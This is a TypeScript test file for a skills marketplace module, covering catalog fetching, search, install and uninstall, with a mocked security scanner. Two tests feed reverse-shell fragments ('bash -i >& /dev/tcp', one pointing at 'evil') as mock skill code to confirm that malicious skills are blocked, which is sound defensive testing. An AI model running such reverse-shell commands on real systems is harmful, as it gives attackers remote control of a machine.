/**
 * TITAN — Marketplace Tests
 * Tests skills/marketplace.ts: catalog fetch, search, install, uninstall
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

vi.mock('../src/utils/logger.js', () => ({
    default: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() },
}));

vi.mock('../src/utils/constants.js', () => ({
    TITAN_MD_FILENAME: 'TITAN.md',
    TITAN_HOME: '/tmp/titan-test-marketplace',
    TITAN_VERSION: '2026.5.16',
}));

vi.mock('fs', async (importOriginal) => {
    const actual = await importOriginal<typeof import('fs')>();
    return {
        ...actual,
        existsSync: vi.fn().mockReturnValue(true),
        mkdirSync: vi.fn(),
        writeFileSync: vi.fn(),
        readdirSync: vi.fn().mockReturnValue([]),
        unlinkSync: vi.fn(),
    };
});

vi.mock('../src/skills/scanner.js', () => ({
    scanSkillCode: vi.fn().mockReturnValue({
        safe: true,
        score: 100,
        findings: [],
        recommendation: 'approve',
    }),
    formatScanResult: vi.fn().mockReturnValue('Scan: OK'),
    quarantineSkill: vi.fn().mockReturnValue({ quarantinedTo: '/tmp/quarantine' }),
    scanAllUserSkills: vi.fn().mockReturnValue({ scanned: 0, safe: 0, warned: 0, blocked: 0, quarantined: [], results: new Map() }),
    generateScanReport: vi.fn().mockReturnValue('# Report'),
}));

const mockFetch = vi.fn();
vi.stubGlobal('fetch', mockFetch);

import { searchSkills, getSkillDetails, installSkill, installFromUrl, listInstalled, uninstallSkill, getCatalog, resetCatalogCache } from '../src/skills/marketplace.js';
import { scanSkillCode } from '../src/skills/scanner.js';
import { existsSync, readdirSync } from 'fs';

const MOCK_CATALOG = {
    version: 1,
    updated: '2026-03-07',
    skills: [
        { name: 'weather_forecast', file: 'weather.js', description: 'Get weather forecasts', category: 'utility', tags: ['weather', 'forecast'], author: 'TITAN Team', version: '1.0.0', requiresApiKey: false },
        { name: 'hacker_news', file: 'hacker_news.js', description: 'Browse Hacker News stories', category: 'news', tags: ['news', 'tech', 'hn'], author: 'TITAN Team', version: '1.0.0', requiresApiKey: false },
        { name: 'docker_manage', file: 'docker_manager.js', description: 'Manage Docker containers', category: 'devops', tags: ['docker', 'containers'], author: 'TITAN Team', version: '1.0.0', requiresApiKey: false },
    ],
};

describe('TITAN Marketplace', () => {
    beforeEach(() => {
        vi.clearAllMocks();
        resetCatalogCache();
        vi.mocked(scanSkillCode).mockReturnValue({
            safe: true,
            score: 100,
            findings: [],
            recommendation: 'approve',
        });
        // Reset fs mocks to defaults
        vi.mocked(existsSync as any).mockReturnValue(true);
        vi.mocked(readdirSync as any).mockReturnValue([]);
    });

    afterEach(() => {
        vi.restoreAllMocks();
    });

    describe('getCatalog', () => {
        it('should fetch catalog from GitHub', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const catalog = await getCatalog();
            expect(catalog.skills).toHaveLength(3);
            expect(catalog.version).toBe(1);
            expect(mockFetch).toHaveBeenCalledWith(
                expect.stringContaining('raw.githubusercontent.com'),
                expect.any(Object),
            );
        });

        it('should return empty catalog on fetch error', async () => {
            mockFetch.mockRejectedValueOnce(new Error('Network error'));
            const catalog = await getCatalog();
            expect(catalog.skills).toEqual([]);
        });

        it('should return empty catalog on HTTP error', async () => {
            mockFetch.mockResolvedValueOnce({ ok: false, status: 500 });
            const catalog = await getCatalog();
            expect(catalog.skills).toEqual([]);
        });
    });

    describe('searchSkills', () => {
        it('should search skills by name', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const result = await searchSkills('weather');
            expect(result.skills).toHaveLength(1);
            expect(result.skills[0].name).toBe('weather_forecast');
            expect(result.total).toBe(1);
        });

        it('should search by category', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const result = await searchSkills('devops');
            expect(result.skills).toHaveLength(1);
            expect(result.skills[0].name).toBe('docker_manage');
        });

        it('should search by tags', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const result = await searchSkills('hn');
            expect(result.skills).toHaveLength(1);
            expect(result.skills[0].name).toBe('hacker_news');
        });

        it('should return all skills for empty query', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const result = await searchSkills('');
            expect(result.skills).toHaveLength(3);
        });

        it('should respect limit', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const result = await searchSkills('', 2);
            expect(result.skills).toHaveLength(2);
            expect(result.total).toBe(3);
        });
    });

    describe('getSkillDetails', () => {
        it('should find skill by name', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const skill = await getSkillDetails('weather_forecast');
            expect(skill).not.toBeNull();
            expect(skill!.name).toBe('weather_forecast');
            expect(skill!.category).toBe('utility');
        });

        it('should find skill by filename', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const skill = await getSkillDetails('weather');
            expect(skill).not.toBeNull();
            expect(skill!.name).toBe('weather_forecast');
        });

        it('should return null for unknown skill', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const skill = await getSkillDetails('nonexistent');
            expect(skill).toBeNull();
        });
    });

    describe('installSkill', () => {
        it('should install a skill from marketplace', async () => {
            // First fetch: catalog
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });
            // Second fetch: skill code
            mockFetch.mockResolvedValueOnce({
                ok: true,
                text: () => Promise.resolve('export default { name: "weather_forecast", execute: async () => "sunny" };'),
            });

            const result = await installSkill('weather_forecast');
            expect(result.success).toBe(true);
            expect(result.skillName).toBe('weather_forecast');
            expect(result.installedPath).toContain('weather.js');
        });

        it('should return error for unknown skill', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });

            const result = await installSkill('nonexistent_skill');
            expect(result.success).toBe(false);
            expect(result.error).toContain('not found');
        });

        it('should block skills with critical scan findings', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });
            mockFetch.mockResolvedValueOnce({
                ok: true,
                text: () => Promise.resolve('bash -i >& /dev/tcp'),
            });
            vi.mocked(scanSkillCode).mockReturnValueOnce({
                safe: false,
                score: 0,
                findings: [{ severity: 'critical', rule: 'REVERSE_SHELL', description: 'Bad' }],
                recommendation: 'block',
            });

            const result = await installSkill('weather_forecast');
            expect(result.success).toBe(false);
            expect(result.error).toContain('security scanner');
        });

        it('should block warned skills unless forced', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });
            mockFetch.mockResolvedValueOnce({
                ok: true,
                text: () => Promise.resolve('risky code'),
            });
            vi.mocked(scanSkillCode).mockReturnValueOnce({
                safe: false,
                score: 30,
                findings: [{ severity: 'high', rule: 'TEST', description: 'Risky' }],
                recommendation: 'warn',
            });

            const result = await installSkill('weather_forecast');
            expect(result.success).toBe(false);
            expect(result.error).toContain('force');
        });

        it('should install warned skills when forced', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });
            mockFetch.mockResolvedValueOnce({
                ok: true,
                text: () => Promise.resolve('some code'),
            });
            vi.mocked(scanSkillCode).mockReturnValueOnce({
                safe: false,
                score: 30,
                findings: [{ severity: 'high', rule: 'TEST', description: 'Warn' }],
                recommendation: 'warn',
            });

            const result = await installSkill('weather_forecast', { force: true });
            expect(result.success).toBe(true);
        });

        it('should handle download failure', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                json: () => Promise.resolve(MOCK_CATALOG),
            });
            mockFetch.mockRejectedValueOnce(new Error('Timeout'));

            const result = await installSkill('weather_forecast');
            expect(result.success).toBe(false);
            expect(result.error).toContain('download');
        });
    });

    describe('uninstallSkill', () => {
        it('should uninstall an installed skill', () => {
            vi.mocked(existsSync as any).mockReturnValue(true);
            vi.mocked(readdirSync as any).mockReturnValue(['weather.js', 'hacker_news.js']);
            const result = uninstallSkill('weather');
            expect(result.success).toBe(true);
        });

        it('should return error for uninstalled skill', () => {
            vi.mocked(existsSync as any).mockReturnValue(true);
            vi.mocked(readdirSync as any).mockReturnValue(['weather.js']);
            const result = uninstallSkill('nonexistent');
            expect(result.success).toBe(false);
            expect(result.error).toContain('not installed');
        });

        it('should return error when no skills dir', () => {
            vi.mocked(existsSync as any).mockReturnValue(false);
            const result = uninstallSkill('weather');
            expect(result.success).toBe(false);
            expect(result.error).toContain('No marketplace skills');
        });
    });

    describe('listInstalled', () => {
        it('should list installed marketplace skills', () => {
            vi.mocked(existsSync as any).mockReturnValue(true);
            vi.mocked(readdirSync as any).mockReturnValue(['weather.js', 'hacker_news.js']);
            const installed = listInstalled();
            expect(installed).toEqual(['weather', 'hacker_news']);
        });

        it('should return empty array when no skills dir', () => {
            vi.mocked(existsSync as any).mockReturnValue(false);
            const installed = listInstalled();
            expect(installed).toEqual([]);
        });
    });

    describe('installFromUrl', () => {
        it('should install a skill from URL', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                text: () => Promise.resolve('export default { name: "test", execute: async () => "ok" };'),
            });

            const result = await installFromUrl('https://example.com/skills/my_skill.js');
            expect(result.success).toBe(true);
            expect(result.skillName).toBe('my_skill');
        });

        it('should return error when fetch fails', async () => {
            mockFetch.mockRejectedValueOnce(new Error('Timeout'));
            const result = await installFromUrl('https://example.com/bad.js');
            expect(result.success).toBe(false);
            expect(result.error).toContain('Failed to fetch');
        });

        it('should block skills that fail security scan', async () => {
            mockFetch.mockResolvedValueOnce({
                ok: true,
                text: () => Promise.resolve('bash -i >& /dev/tcp/evil'),
            });
            vi.mocked(scanSkillCode).mockReturnValueOnce({
                safe: false,
                score: 0,
                findings: [{ severity: 'critical', rule: 'REVERSE_SHELL', description: 'Evil' }],
                recommendation: 'block',
            });

            const result = await installFromUrl('https://example.com/evil.js');
            expect(result.success).toBe(false);
            expect(result.error).toContain('Blocked');
        });
    });
});
